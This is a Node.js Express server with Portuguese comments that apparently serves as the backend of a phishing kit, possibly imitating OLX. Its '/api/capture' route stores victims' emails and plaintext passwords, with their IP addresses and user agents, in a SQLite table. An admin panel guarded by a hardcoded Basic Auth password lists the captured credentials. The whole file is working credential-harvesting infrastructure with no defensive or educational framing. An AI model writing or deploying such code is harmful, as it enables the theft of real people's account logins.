const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Banco de dados SQLite local
const db = new sqlite3.Database('./database.sqlite');
db.run(`CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT,
    password TEXT,
    method TEXT,
    ip TEXT,
    user_agent TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

// Rota para receber os dados do frontend
app.post('/api/capture', (req, res) => {
    const { email, password, method } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const user_agent = req.headers['user-agent'];

    if (!email || !password) return res.status(400).json({ error: 'Dados incompletos' });

    db.run(`INSERT INTO logs (email, password, method, ip, user_agent) VALUES (?, ?, ?, ?, ?)`,
        [email, password, method, ip, user_agent],
        function(err) {
            if (err) return res.status(500).json({ error: err.message });
            res.status(200).json({ success: true, id: this.lastID });
        }
    );
});

// Rota do Painel Admin (protegida por Basic Auth)
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'olxadmin2024'; // MUDE ESTA SENHA

app.get('/admin', (req, res) => {
    const b64auth = (req.headers.authorization || '').split(' ')[1] || '';
    const [login, password] = Buffer.from(b64auth, 'base64').toString().split(':');

    if (login && password && login === ADMIN_USER && password === ADMIN_PASS) {
        return res.sendFile(path.join(__dirname, 'public', 'admin.html'));
    }

    res.set('WWW-Authenticate', 'Basic realm="401"');
    res.status(401).send('Autenticação necessária.');
});

// Rota da API do painel para listar os dados (também protegida)
app.get('/api/logs', (req, res) => {
    const b64auth = (req.headers.authorization || '').split(' ')[1] || '';
    const [login, password] = Buffer.from(b64auth, 'base64').toString().split(':');

    if (login !== ADMIN_USER || password !== ADMIN_PASS) {
        return res.status(401).json({ error: 'Não autorizado' });
    }

    db.all(`SELECT * FROM logs ORDER BY id DESC`, [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

app.listen(PORT, () => console.log(`Servidor rodando em http://localhost:${PORT}`));